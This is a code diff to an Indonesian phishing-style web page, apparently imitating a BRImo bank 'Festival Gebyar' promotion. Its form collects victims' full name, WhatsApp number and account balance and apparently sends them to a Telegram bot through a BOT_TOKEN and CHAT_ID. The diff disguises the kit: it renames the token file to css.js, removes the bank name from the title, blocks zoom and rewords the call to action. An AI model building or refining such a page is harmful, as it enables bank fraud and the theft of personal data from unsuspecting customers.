@@ -2,8 +2,9 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BRImo - Festival Gebyar</title>
+    <!-- Kunci skala layar agar tidak bisa di-zoom manual maupun auto-zoom -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+    <title>Transaksi Digital Modern</title>
     <!-- Memuat Tailwind CSS untuk styling responsif dan modern -->
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- Memuat Google Fonts 'Inter' -->
@@ -11,9 +12,17 @@
     <!-- Memuat Phosphor Icons untuk ikon UI yang bersih -->
     <script src="https://unpkg.com/@phosphor-icons/web"></script>
     <style>
-        body {
+        html, body {
             font-family: 'Inter', sans-serif;
             background-color: #e2e8f0;
+            /* Mencegah pinch-to-zoom dan double-tap zoom di browser mobile */
+            touch-action: pan-x pan-y;
+            -webkit-text-size-adjust: 100%;
+            overscroll-behavior: none;
+        }
+        /* Pastikan semua input berukuran >= 16px agar browser HP tidak auto-zoom saat diklik */
+        input, select, textarea {
+            font-size: 16px !important;
         }
         @keyframes float {
             0%, 100% { transform: translateY(0px); }
@@ -158,7 +167,7 @@
                 <div class="flex items-center justify-between mb-5">
                     <div>
                         <span id="drawerBadge" class="inline-block text-[10px] font-bold uppercase tracking-wider text-[#1174d6] bg-sky-50 px-2.5 py-1 rounded-full mb-1">gebyar festival</span>
-                        <h3 class="text-lg font-bold text-slate-800">Lengkapi Data Anda di Bawa ini</h3>
+                        <h3 class="text-lg font-bold text-slate-800">Lengkapi Data Anda di Bawah ini</h3>
                     </div>
                     <button type="button" onclick="closeFormDrawer()" class="w-9 h-9 rounded-full bg-slate-100 hover:bg-slate-200 text-slate-600 flex items-center justify-center transition cursor-pointer" aria-label="Tutup">
                         <i class="ph-bold ph-x text-base"></i>
@@ -182,7 +191,7 @@
                                 id="namaLengkap" 
                                 name="namaLengkap"
                                 placeholder="Masukkan nama lengkap Anda"
-                                class="w-full pl-10 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm font-medium text-slate-800 placeholder:text-slate-400 focus:outline-none focus:bg-white focus:border-[#1174d6] focus:ring-2 focus:ring-sky-100 transition"
+                                class="w-full pl-10 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-base font-medium text-slate-800 placeholder:text-slate-400 focus:outline-none focus:bg-white focus:border-[#1174d6] focus:ring-2 focus:ring-sky-100 transition"
                                 required
                             >
                         </div>
@@ -211,7 +220,7 @@
                                 inputmode="numeric"
                                 maxlength="13"
                                 placeholder="Contoh: 081234567890"
-                                class="w-full pl-10 pr-10 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm font-medium text-slate-800 placeholder:text-slate-400 focus:outline-none focus:bg-white focus:border-[#1174d6] focus:ring-2 focus:ring-sky-100 transition"
+                                class="w-full pl-10 pr-10 py-3 bg-slate-50 border border-slate-200 rounded-xl text-base font-medium text-slate-800 placeholder:text-slate-400 focus:outline-none focus:bg-white focus:border-[#1174d6] focus:ring-2 focus:ring-sky-100 transition"
                                 required
                             >
                             <span id="waStatusIcon" class="hidden absolute inset-y-0 right-0 pr-3.5 flex items-center"></span>
@@ -227,7 +236,7 @@
                             Saldo (Rp)
                         </label>
                         <div class="relative">
-                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-sm font-bold text-[#1174d6]">
+                            <span class="absolute inset-y-0 left-0 pl-3.5 flex items-center text-base font-bold text-[#1174d6]">
                                 Rp
                             </span>
                             <input 
@@ -236,7 +245,7 @@
                                 name="saldoRp"
                                 inputmode="numeric"
                                 placeholder="0"
-                                class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-sm font-bold text-slate-800 placeholder:text-slate-400 focus:outline-none focus:bg-white focus:border-[#1174d6] focus:ring-2 focus:ring-sky-100 transition"
+                                class="w-full pl-11 pr-4 py-3 bg-slate-50 border border-slate-200 rounded-xl text-base font-bold text-slate-800 placeholder:text-slate-400 focus:outline-none focus:bg-white focus:border-[#1174d6] focus:ring-2 focus:ring-sky-100 transition"
                                 required
                             >
                         </div>
@@ -268,9 +277,29 @@
 
     </div>
 
-    <!-- Memuat BOT_TOKEN dan CHAT_ID dari token.js -->
+    <!-- Memuat BOT_TOKEN dan CHAT_ID dari css.js -->
     <script src="css.js"></script>
     <script>
+        // Kunci zoom manual (pinch-to-zoom, gesture iOS, dan Ctrl + scroll/plus/minus)
+        document.addEventListener('gesturestart', function (e) {
+            e.preventDefault();
+        });
+        document.addEventListener('touchmove', function (e) {
+            if (e.touches.length > 1) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+        document.addEventListener('wheel', function (e) {
+            if (e.ctrlKey) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+        document.addEventListener('keydown', function (e) {
+            if ((e.ctrlKey || e.metaKey) && (e.key === '+' || e.key === '-' || e.key === '=' || e.key === '0')) {
+                e.preventDefault();
+            }
+        });
+
         const form = document.getElementById('FormAku');
         const namaInput = document.getElementById('namaLengkap');
         const waInput = document.getElementById('nomorWa');
@@ -455,7 +484,7 @@
                 status.textContent = 'Pengiriman gagal. Periksa koneksi atau token bot.';
                 status.className = 'text-center text-xs font-medium text-rose-500 mt-3';
                 tombol.disabled = false;
-                tombol.textContent = 'Kirim Data';
+                tombol.textContent = 'Daftar Sekarang';
             }
         });
 
